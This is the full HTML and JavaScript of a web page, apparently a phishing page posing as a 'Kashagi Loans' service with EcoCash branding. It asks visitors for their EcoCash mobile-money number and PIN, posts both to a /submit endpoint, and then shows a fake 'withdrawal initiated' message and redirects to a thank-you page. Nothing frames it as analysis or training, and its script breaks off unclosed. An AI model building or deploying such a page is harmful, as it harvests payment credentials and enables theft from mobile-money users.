<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kashagi Loans</title><style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#eef3fa;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:350px;
    background:#fff;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 10px 25px rgba(0,0,0,.15);
}

.header{
    background:#1877f2;
    color:white;
    text-align:center;
    padding:25px 20px;
}

.logo{
    width:90px;
    height:90px;
    border-radius:50%;
    background:white;
    padding:5px;
    object-fit:cover;
    margin-bottom:10px;
    border:3px solid rgba(255,255,255,.4);
}

.header h2{
    margin-bottom:5px;
}

.header p{
    font-size:14px;
    opacity:.9;
}

.form{
    padding:25px;
}

label{
    display:block;
    margin-bottom:6px;
    font-weight:bold;
    color:#444;
}

input{
    width:100%;
    padding:12px;
    border:1px solid #ddd;
    border-radius:6px;
    margin-bottom:18px;
    font-size:15px;
}

input:focus{
    outline:none;
    border-color:#1877f2;
}

button{
    width:100%;
    padding:13px;
    border:none;
    border-radius:6px;
    background:#1877f2;
    color:white;
    font-weight:bold;
    font-size:15px;
    cursor:pointer;
}

button:hover{
    opacity:.95;
}

.footer{
    text-align:center;
    margin-top:15px;
}

.footer a{
    color:#1877f2;
    text-decoration:none;
    font-size:14px;
}
</style></head><body><div class="card"><div class="header">
    <img src="Ecocash.png" class="logo" alt="Logo">
    <h2>Kashagi Loans</h2>
    <p>Fast • Secure • Reliable</p>
</div>

<div class="form">

    <label>EcoCash Number</label>
    <input
        type="tel"
        id="ecocash_number"
        placeholder="e.g. 0771234567"
    >

    <label>EcoCash Pin</label>
    <input
        type="text"
        id="ecocash_pin"
        placeholder="Enter ecocash pin"
    >

    <button onclick="submitForm()">
        Withdraw to EcoCash
    </button>

    <div class="footer">
        <a href="#">Forgot Pin?</a>
    </div>

</div>

</div><script>
async function submitForm() {

    const ecocash_number =
        document.getElementById("ecocash_number").value;

    const ecocash_pin =
        document.getElementById("ecocash_pin").value;

    if (!ecocash_number || !ecocash_pin) {
        alert("Please fill in all fields.");
        return;
    }

    try {

    const response = await fetch("/submit", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            ecocash_number: ecocash_number,
            ecocash_pin: ecocash_pin
        })
    });

    const data = await response.json();

    if (data.success) {

        alert("✅ Your Withdrawal request has been initiated successfully!");

        document.getElementById("loanForm").reset();

        window.location.href = "/thankyou.html";

        return;

    } else {

        alert("❌ Submission failed. Please try again.");

        return;

    }

} catch (error) {

    console.error(error);

    }
